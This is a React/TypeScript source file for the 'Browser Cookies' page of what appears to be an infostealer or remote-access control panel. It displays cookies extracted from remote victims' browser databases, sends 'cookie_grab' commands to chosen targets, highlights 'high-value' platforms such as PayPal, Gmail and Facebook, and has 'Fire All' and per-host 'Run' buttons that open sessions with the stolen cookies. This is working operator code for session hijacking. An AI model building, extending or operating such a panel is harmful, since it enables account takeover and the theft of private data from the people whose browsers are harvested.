import { useState, useEffect, useRef, useMemo } from 'react'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'
import ClientFilter from '../../UI/ClientFilter'
import type { ClientInfo } from '../../UI/ClientFilter'
import { useDashboardStore } from '../../store/dashboardStore.ts'

interface CookieEntry {
  id: number
  client_id: string
  browser: string
  host: string
  name: string
  value: string
  path: string | null
  domain: string | null
  secure: number
  http_only: number
  expires: number | null
  first_seen: number
  last_updated: number
  client_hostname?: string
  client_username?: string
}

function fmtTime(ts: number) {
  return new Date(ts).toLocaleString('en-US', { hour12: false })
}

export default function CookiesPage() {
  const { isConnected, subscribe, send } = useBridgeWebSocket()
  const { impersonateUserId, clients: cachedClients } = useDashboardStore()

  const [clients, setClients] = useState<ClientInfo[]>([])
  const [clientId, setClientId] = useState('all')
  const [cookies, setCookies] = useState<CookieEntry[]>([])
  const [search, setSearch] = useState('')
  const [loading, setLoading] = useState(false)
  const [runningHosts, setRunningHosts] = useState<Set<string>>(new Set())

  const allCookiesRef = useRef<Record<string, CookieEntry[]>>({})

  useEffect(() => {
    if (cachedClients.length > 0) {
      setClients(cachedClients as ClientInfo[])
    }
  }, [cachedClients])

  // Load cookies when client changes
  useEffect(() => {
    if (!isConnected) return
    setLoading(true)
    if (clientId === 'all') {
      send({ type: 'db_query', query: 'get_all_cookies', limit: 1000, impersonateUserId: impersonateUserId ?? undefined })
    } else {
      send({ type: 'db_query', query: 'get_cookies', clientId, limit: 1000, impersonateUserId: impersonateUserId ?? undefined })
    }
  }, [isConnected, clientId, send, impersonateUserId])

  // Listen for DB responses and real-time cookie events
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('db_response', (msg: any) => {
      if (msg.query === 'get_cookies' || msg.query === 'get_all_cookies') {
        const entries: CookieEntry[] = (msg.data || []).map((row: any) => ({
          id: row.id,
          client_id: row.client_id,
          browser: row.browser,
          host: row.host,
          name: row.name,
          value: row.value,
          path: row.path,
          domain: row.domain,
          secure: row.secure,
          http_only: row.http_only,
          expires: row.expires,
          first_seen: row.first_seen,
          last_updated: row.last_updated,
          client_hostname: row.client_hostname,
          client_username: row.client_username,
        }))
        if (msg.query === 'get_cookies' && msg.clientId) {
          allCookiesRef.current[msg.clientId] = entries
          setCookies(entries)
        } else {
          const grouped: Record<string, CookieEntry[]> = {}
          for (const e of entries) {
            if (!grouped[e.client_id]) grouped[e.client_id] = []
            grouped[e.client_id].push(e)
          }
          allCookiesRef.current = grouped
          setCookies(entries)
        }
        setLoading(false)
      }
    })

    // Real-time cookie data notification
    const unsub2 = subscribe('cookie_data', (msg: any) => {
      const cid: string = msg.clientId
      if (!cid) return
      // Refresh cookies for this client
      send({ type: 'db_query', query: 'get_cookies', clientId: cid, limit: 1000, impersonateUserId: impersonateUserId ?? undefined })
    })

    const unsub3 = subscribe('client_list', (msg: any) => {
      if (Array.isArray(msg.clients)) setClients(msg.clients)
    })

    return () => { unsub(); unsub2(); unsub3() }
  }, [isConnected, subscribe, send, impersonateUserId])

  const handleClientChange = (id: string) => {
    setClientId(id)
  }

  // ── Deduplicate: one row per unique (client_id + normalised host) ──────
  const deduped: (CookieEntry & { cookieCount: number })[] = useMemo(() => {
    const map = new Map<string, { entry: CookieEntry; count: number }>()
    for (const c of cookies) {
      const normHost = c.host.replace(/^\.+/, '').toLowerCase()
      const key = `${c.client_id}::${normHost}`
      const existing = map.get(key)
      if (!existing || c.last_updated > existing.entry.last_updated) {
        map.set(key, { entry: c, count: (existing?.count ?? 0) + 1 })
      } else {
        existing.count++
      }
    }
    return Array.from(map.values()).map(({ entry, count }) => ({ ...entry, cookieCount: count }))
  }, [cookies])

  const filtered = search.trim()
    ? deduped.filter(c =>
        c.host.toLowerCase().includes(search.toLowerCase()) ||
        c.browser.toLowerCase().includes(search.toLowerCase()) ||
        (c.client_hostname && c.client_hostname.toLowerCase().includes(search.toLowerCase())))
    : deduped

  const totalUniqueHosts = deduped.length

  // ── Platform stats ─────────────────────────────────────────────────────
  const HIGH_VALUE_PLATFORMS = [
    { domain: 'facebook.com', name: 'Facebook' },
    { domain: 'instagram.com', name: 'Instagram' },
    { domain: 'twitter.com', name: 'Twitter/X' },
    { domain: 'x.com', name: 'X' },
    { domain: 'tiktok.com', name: 'TikTok' },
    { domain: 'linkedin.com', name: 'LinkedIn' },
    { domain: 'snapchat.com', name: 'Snapchat' },
    { domain: 'reddit.com', name: 'Reddit' },
    { domain: 'discord.com', name: 'Discord' },
    { domain: 'netflix.com', name: 'Netflix' },
    { domain: 'disneyplus.com', name: 'Disney+' },
    { domain: 'hulu.com', name: 'Hulu' },
    { domain: 'hbomax.com', name: 'HBO Max' },
    { domain: 'spotify.com', name: 'Spotify' },
    { domain: 'twitch.tv', name: 'Twitch' },
    { domain: 'youtube.com', name: 'YouTube' },
    { domain: 'amazon.com', name: 'Amazon' },
    { domain: 'paypal.com', name: 'PayPal' },
    { domain: 'steamcommunity.com', name: 'Steam' },
    { domain: 'epicgames.com', name: 'Epic Games' },
    { domain: 'gmail.com', name: 'Gmail' },
    { domain: 'outlook.com', name: 'Outlook' },
    { domain: 'whatsapp.com', name: 'WhatsApp' },
    { domain: 'telegram.org', name: 'Telegram' },
    { domain: 'slack.com', name: 'Slack' },
  ]

  const platformStats = HIGH_VALUE_PLATFORMS.map(p => {
    const count = cookies.filter(c => {
      const h = c.host.toLowerCase()
      return h === p.domain || h.endsWith('.' + p.domain)
    }).length
    return { ...p, count }
  }).filter(p => p.count > 0)

  const [firingAll, setFiringAll] = useState(false)
  const [grabbing, setGrabbing] = useState(false)
  const [sessionError, setSessionError] = useState('')

  // Show bridge errors (e.g. "No cookies found for host")
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('error', (msg: any) => {
      if (!msg.message) return
      setSessionError(msg.message)
      setTimeout(() => setSessionError(''), 5000)
    })
    return () => unsub()
  }, [isConnected, subscribe])


  const handleFireAll = () => {
    if (!clientId || clientId === 'all') return
    setFiringAll(true)
    send({ type: 'fire_all_cookie_sessions', clientId })
    setTimeout(() => setFiringAll(false), 5000)
  }

  const handleGrabCookies = () => {
    if (!clientId || clientId === 'all') return
    setGrabbing(true)
    send({ type: 'cookie_grab', clientId })
    setTimeout(() => setGrabbing(false), 3000)
  }

  return (
    <div className="flex flex-col h-full space-y-4 min-h-0">

      {/* ── Header ─────────────────────────────────────────────────────── */}
      <div className="flex items-start justify-between flex-wrap gap-3">
        <div>
          <h3 className="text-2xl font-semibold text-slate-100 tracking-tight">
            Browser Cookies
          </h3>
          <p className="text-sm text-slate-500 mt-0.5">
            Cookies extracted from browser databases in real-time. Auto-fires sessions for detected platforms.
          </p>
        </div>
      </div>

      {/* ── Controls row ────────────────────────────────────────────────── */}
      <div className="flex items-center gap-3 flex-wrap">
        <ClientFilter
          clients={clients}
          value={clientId}
          onChange={handleClientChange}
          allowAll
          allLabel="All clients"
          placeholder="Select target..."
        />

        <div className="relative flex-1 min-w-50">
          <input
            type="text"
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Filter host, name, value, browser..."
            className="w-full pl-4 pr-8 py-1.5 bg-slate-900 border border-slate-700 rounded-md text-sm text-slate-200 placeholder-slate-600 focus:outline-none focus:border-slate-500"
          />
          {search && (
            <button onClick={() => setSearch('')}
              className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-500 hover:text-slate-300 text-xs">
              ×
            </button>
          )}
        </div>

        {/* ── Action buttons ──────────────────────────────────────────────── */}
        {clientId && clientId !== 'all' && (
          <div className="flex items-center gap-2">
            <button
              onClick={handleGrabCookies}
              disabled={grabbing}
              className={`px-3 py-1.5 text-xs font-semibold rounded transition-all ${
                grabbing
                  ? 'bg-amber-600/30 text-amber-400 cursor-not-allowed'
                  : 'bg-amber-700/40 hover:bg-amber-700/60 text-amber-300 hover:text-amber-200'
              }`}
            >
              {grabbing ? '⏳ Grabbing...' : '🔄 Grab Cookies'}
            </button>
            <button
              onClick={handleFireAll}
              disabled={firingAll || platformStats.length === 0}
              className={`px-3 py-1.5 text-xs font-semibold rounded transition-all ${
                firingAll
                  ? 'bg-emerald-600/30 text-emerald-400 cursor-not-allowed'
                  : platformStats.length === 0
                    ? 'bg-slate-800/50 text-slate-600 cursor-not-allowed'
                    : 'bg-emerald-700/40 hover:bg-emerald-700/60 text-emerald-300 hover:text-emerald-200'
              }`}
            >
              {firingAll ? '⏳ Firing...' : `🔥 Fire All (${platformStats.length})`}
            </button>
          </div>
        )}
      </div>

      {/* ── Error banner ─────────────────────────────────────────────── */}
      {sessionError && (
        <div className="flex items-center gap-2 px-3 py-2 bg-red-950/60 border border-red-800/60 rounded-md text-xs text-red-300">
          <span>⚠</span>
          <span>{sessionError}</span>
          <button onClick={() => setSessionError('')} className="ml-auto text-red-500 hover:text-red-300">×</button>
        </div>
      )}

      {/* ── Platform stats chips ──────────────────────────────────────────── */}
      {platformStats.length > 0 && (
        <div className="flex items-center gap-2 flex-wrap">
          {platformStats.map(p => (
            <span key={p.domain} className="inline-flex items-center gap-1 px-2 py-0.5 bg-slate-900 border border-slate-700 rounded-full text-[11px] text-slate-300">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-500/60" />
              {p.name}
              <span className="text-slate-500 ml-0.5">({p.count})</span>
            </span>
          ))}
        </div>
      )}

      {/* ── Stats bar ───────────────────────────────────────────────────── */}
      <div className="flex items-center gap-4 text-[11px] text-slate-600">
        <span><span className="text-slate-400">{totalUniqueHosts}</span> unique hosts</span>
        <span><span className="text-slate-400">{cookies.length}</span> total cookies</span>
        {search && <span className="text-sky-500">{filtered.length} match{filtered.length !== 1 ? 'es' : ''}</span>}
      </div>

      {/* ── Cookie Table ────────────────────────────────────────────────── */}
      <div className="flex-1 min-h-0 bg-slate-950 border border-slate-800 rounded-lg overflow-y-auto">
        {loading ? (
          <div className="flex items-center justify-center h-64 text-slate-500">
            Loading cookies...
          </div>
        ) : filtered.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-64 text-slate-600 gap-3">
            <span className="text-4xl opacity-20">🍪</span>
            <span>No cookies captured yet. Cookie grabber data will appear here.</span>
          </div>
        ) : (
          <table className="w-full text-sm">
            <thead className="sticky top-0 bg-slate-900/95 backdrop-blur">
              <tr className="border-b border-slate-800 text-left text-[11px] uppercase tracking-wider text-slate-500">
                <th className="px-4 py-3 font-semibold">Host</th>
                <th className="px-4 py-3 font-semibold">Cookies</th>
                <th className="px-4 py-3 font-semibold">Browser</th>
                <th className="px-4 py-3 font-semibold">Client</th>
                <th className="px-4 py-3 font-semibold">Last Updated</th>
                <th className="px-4 py-3 font-semibold text-center">Run</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/50">
              {filtered.map(entry => {
                const normHost = entry.host.replace(/^\.+/, '')
                const targetUrl = 'https://' + normHost
                const isRunning = runningHosts.has(normHost)
                return (
                  <tr key={`${entry.client_id}::${normHost}`} className="hover:bg-slate-900/60 transition-colors">
                    <td className="px-4 py-3">
                      <span className="text-sky-400 font-mono text-[13px]">{normHost}</span>
                    </td>
                    <td className="px-4 py-3">
                      <span className="inline-flex items-center px-2 py-0.5 rounded-full bg-slate-800 border border-slate-700 text-[11px] font-semibold text-slate-300">
                        {entry.cookieCount}
                      </span>
                    </td>
                    <td className="px-4 py-3 text-slate-500 text-[13px]">{entry.browser}</td>
                    <td className="px-4 py-3 text-slate-400 text-[13px]">
                      {entry.client_hostname || entry.client_id?.slice(0, 12)}
                    </td>
                    <td className="px-4 py-3 text-slate-500 text-[12px] whitespace-nowrap">
                      {fmtTime(entry.last_updated)}
                    </td>
                    <td className="px-4 py-3 text-center">
                      <button
                        onClick={() => {
                          setRunningHosts(prev => new Set(prev).add(normHost))
                          send({ type: 'open_cookie_session', host: targetUrl, clientId: entry.client_id })
                          setTimeout(() => setRunningHosts(prev => { const n = new Set(prev); n.delete(normHost); return n }), 4000)
                        }}
                        disabled={isRunning}
                        className={`px-2.5 py-1 text-[11px] font-semibold rounded transition-all ${
                          isRunning
                            ? 'bg-emerald-600/30 text-emerald-400 cursor-not-allowed'
                            : 'bg-sky-800/60 hover:bg-sky-700/60 text-sky-300 hover:text-white'
                        }`}
                      >
                        {isRunning ? '⏳ Opening…' : '▶ Run'}
                      </button>
                    </td>
                  </tr>
                )
              })}
            </tbody>
          </table>
        )}
      </div>
    </div>
  )
}
